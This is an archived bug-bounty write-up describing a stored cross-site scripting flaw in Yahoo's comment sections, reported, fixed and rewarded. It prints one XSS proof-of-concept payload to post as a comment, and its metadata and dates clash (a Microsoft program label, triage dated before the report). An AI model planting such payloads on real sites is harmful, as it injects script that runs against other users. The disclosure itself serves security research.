---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-05-19_stored-xss-in-yahoo-and-all-subdomains.md
original_filename: 2018-05-19_stored-xss-in-yahoo-and-all-subdomains.md
title: Stored XSS in Yahoo and all subdomains!
category: documents
detected_topics:
- xss
- command-injection
tags:
- imported
- documents
- xss
- command-injection
language: en
raw_sha256: bcd80b5b68e7886a3f688b8046c26d06d8074444ca29b86f024309e721443ceb
text_sha256: 9deedadd5051aaf627860a432ba9142e2ede565a16b25ba767553de063b8ea1b
ingested_at: '2026-06-28T07:31:57Z'
sensitivity: unknown
redactions_applied: false
---

# Stored XSS in Yahoo and all subdomains!

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-05-19_stored-xss-in-yahoo-and-all-subdomains.md
- Source Type: markdown
- Detected Topics: xss, command-injection
- Ingested At: 2026-06-28T07:31:57Z
- Redactions Applied: False
- Raw SHA256: `bcd80b5b68e7886a3f688b8046c26d06d8074444ca29b86f024309e721443ceb`
- Text SHA256: `9deedadd5051aaf627860a432ba9142e2ede565a16b25ba767553de063b8ea1b`


## Content

---
title: "Stored XSS in Yahoo and all subdomains!"
url: "https://medium.com/@ozil.hakim/stored-xss-in-yahoo-and-all-subdomains-bbcaa7c3b8d"
authors: ["Hakim Bencella (@H4kst3r)"]
programs: ["Microsoft"]
bugs: ["Stored XSS"]
bounty: "1,500"
publication_date: "2018-05-19"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5879
scraped_via: "browseros"
---

# Stored XSS in Yahoo and all subdomains!

Stored XSS in Yahoo and all subdomains!
Hakim Bencella
Follow
1 min read
·
May 19, 2018

288

1

Press enter or click to view image in full size

This is Hakim Bencella (H4kst3r) , and im from ALGERIA.

I always believed that sharing is caring, and i have been learning from multiple security researchers in the bug bounty field ,
Now, I am going to share with how I found Stored Cross-Site Scripting (XSS)

in Yahoo (all domains where you can post a comment)

Steps to Reproduce :

Go to https://www.yahoo.com/*

Comment this payload:

<script>alert();</script>”><<script>alert();</script>img src=x onerror=alert();>

Get Hakim Bencella’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

ANDD YEEAAH :D

Press enter or click to view image in full size

Here is the video PoC:

Timeline :

27/11/2017— Initial Report.

30/10/2017 — Triaged + initial reward 300$

23/02/2018 — Bug Resolved. + $1200 bounty rewarded. ( Total $1500 )

/H4kst3r :

https://hackerone.com/H4kst3r

https://www.instagram.com/i.c0de/

https://twitter.com/H4kst3r

https://facebook.com/H4kst3r
